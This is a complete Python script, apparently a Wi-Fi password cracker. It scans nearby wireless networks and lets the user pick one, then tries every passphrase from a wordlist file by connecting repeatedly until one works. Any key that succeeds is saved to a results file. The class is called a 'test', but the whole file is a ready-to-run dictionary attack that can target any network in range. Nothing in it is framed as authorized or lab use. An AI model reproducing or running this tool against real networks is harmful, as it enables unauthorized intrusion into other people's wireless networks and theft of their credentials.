#!/usr/bin/python3
import os
import sys
import time
from pywifi import const, PyWiFi

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

status_code = {const.IFACE_DISCONNECTED: 'DISCONNETED',
               const.IFACE_SCANNING: 'SCANNING',
               const.IFACE_INACTIVE: 'INACTIVE',
               const.IFACE_CONNECTING: 'CONNECTING',
               const.IFACE_CONNECTED: 'CONNECTED'}

akm_name_value = {const.AKM_TYPE_NONE: 'NONE',
                  const.AKM_TYPE_WPA: 'WPA',
                  const.AKM_TYPE_WPAPSK: 'WPAPSK',
                  const.AKM_TYPE_WPA2: 'WPA2',
                  const.AKM_TYPE_WPA2PSK: 'WPA2PSK',
                  const.AKM_TYPE_UNKNOWN: 'UNKNOWN'}


def get_akm_name(ap):
    akm_names = []
    for a in ap.akm:
        if a in akm_name_value.keys():
            akm_names.append(akm_name_value[a])
    if len(akm_names) == 0:
        akm_names.append("OPEN")

    return '/'.join(akm_names)


def get_akm_cipher(ap):
    akm_name = akm_name_value[ap.akm[-1]]
    if 'WPA2' in akm_name:
        return const.CIPHER_TYPE_CCMP
    elif 'WPA' in akm_name:
        return const.CIPHER_TYPE_TKIP
    else:
        return const.CIPHER_TYPE_NONE


def get_wifi_interface():
    wifi = PyWiFi()
    if len(wifi.interfaces()) <= 0:
        sys.exit('No wifi inteface found!')
    print("=" * 73)
    if len(wifi.interfaces()) == 1:
        print(O + 'Wifi interface found:' + C +
              wifi.interfaces()[0].name() + W)
        return wifi.interfaces()[0]
    else:
        print('%-4s   %s' % ('No', 'interface name'))
        for i, w in enumerate(wifi.interfaces()):
            print('%-4s   %s' % (i, w.name()))
        while True:
            iface_no = input('Please choose interface No:')
            no = int(iface_no)
            if no >= 0 and no < len(wifi.interfaces()):
                return wifi.interfaces()[no]


def wifi_scan(iface):
    print("-" * 73)
    print("%-2s   %-19s   %-17s  %-6s  %s" %
          ('No', 'SSID', 'BSSID', 'SIGNAL', 'ENC/AUTH'))
    iface.scan()
    time.sleep(5)
    scan_result = {}
    for ap in iface.scan_results():
        scan_result[ap.bssid] = ap
    aps = list(scan_result.values())
    aps.sort(key=lambda x: x.signal, reverse=True)
    for i, ap in enumerate(aps):
        ssid = ap.ssid
        if len(ssid) == 0:
            ssid = '<length: 0>'
        elif ssid == '\\x00':
            ssid = '<length: 1>'
        if int(ap.signal) >= -60:
            power = G + "%-4s" % (ap.signal) + GR
        elif int(ap.signal) < -60 and int(ap.signal) >= -70:
            power = O + "%-4s" % (ap.signal) + GR
        else:
            power = R + "%-4s" % (ap.signal) + GR
        sys.stdout.write(G + "%-2s" % (i + 1) + GR + " | " + B + "%-19s" % (ssid[0:19]) +
                         GR + " | " + P + "%-17s" % (ap.bssid.rstrip(':')) + GR + " | " +
                         power + " | " + C + "%s\n" % (get_akm_name(ap)) + W)
    sys.stdout.flush()
    return aps


class Wifi_Test():

    def __init__(self, iface, ap):
        self.iface = iface
        self.ap = ap
        self.timeout = 30
        self.ap_id = ap.bssid.rstrip(':') if len(ap.ssid) == 0 \
            or ap.ssid == '\\x00' or len(ap.ssid) > len(ap.bssid) else ap.ssid
        self.ap.cipher = get_akm_cipher(ap)

    def test(self, key):
        self.ap.key = key.strip('\r\n')
        self.iface.remove_all_network_profiles()
        self.iface.connect(self.iface.add_network_profile(self.ap))
        start_time = time.time()
        while True:
            time.sleep(0.1)
            code = self.iface.status()
            now_time = time.time() - start_time
            if now_time <= 5:
                now = G + "%5.2fs" % (now_time)
            elif now_time > 5 and now_time <= 10:
                now = O + "%5.2fs" % (now_time)
            elif now_time > 10 and now_time <= self.timeout:
                now = R + "%5.2fs" % (now_time)
            else:
                break
            sys.stdout.write(B + "\r%-17s" % (self.ap_id) + GR + " | " + now + GR +
                             " | " + C + "%-20s" % (self.ap.key) + GR +
                             " | " + P + "%-12s" % (status_code[code]) + W)
            sys.stdout.flush()
            if code == const.IFACE_DISCONNECTED:
                break
            if code == const.IFACE_CONNECTED:
                self.iface.disconnect()
                sys.stdout.write(B + "\r%-17s" % (self.ap_id) + GR + " | " + now +
                                 GR + " | " + C + "%-20s" % (self.ap.key) +
                                 GR + " | " + B + "%-12s" % ("FOUND!") + W)
                sys.stdout.flush()
                return self.ap.key
        if code == const.IFACE_DISCONNECTED and now_time < 1:
            sys.stdout.write(B + "\r%-17s" % (self.ap_id) + GR + " | " + now +
                             GR + " | " + C + "%-20s" % (self.ap.key) + GR + " | " +
                             O + "%-12s" % ("BUSY!") + W)
            sys.stdout.flush()
            time.sleep(10)
            self.test(key)
        return False


def main():
    if sys.platform == 'win32':
        os.system('cls')
    iface = get_wifi_interface()
    while True:
        aps = wifi_scan(iface)
        ap_num = int(input(O + '\nPlease choose test No:' + W))
        if ap_num >= 1 and ap_num <= len(aps) + 1:
            ap = aps[ap_num - 1]
            break
        else:
            continue
    print("%s\n%-18s| %6s | %-20s | %-12s" %
          ("=" * 73, "SSID OR BSSID", "TIME ", "KEY", "STATUS"))
    wifi_test = Wifi_Test(iface, ap)
    with open('wordlist.txt') as keys:
        for key in keys:
            result = wifi_test.test(key)
            if result:
                break
    print("\n" + "-" * 73)
    if result:
        with open('result.txt', "a") as f:
            f.write("%-18s | %s | %s\n" %
                    (ap.ssid, ap.bssid.rstrip(':'), result))
        print(G + 'Done...' + W)
    else:
        print(R + 'Fail...' + W)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
    except Exception as e:
        sys.exit(e)
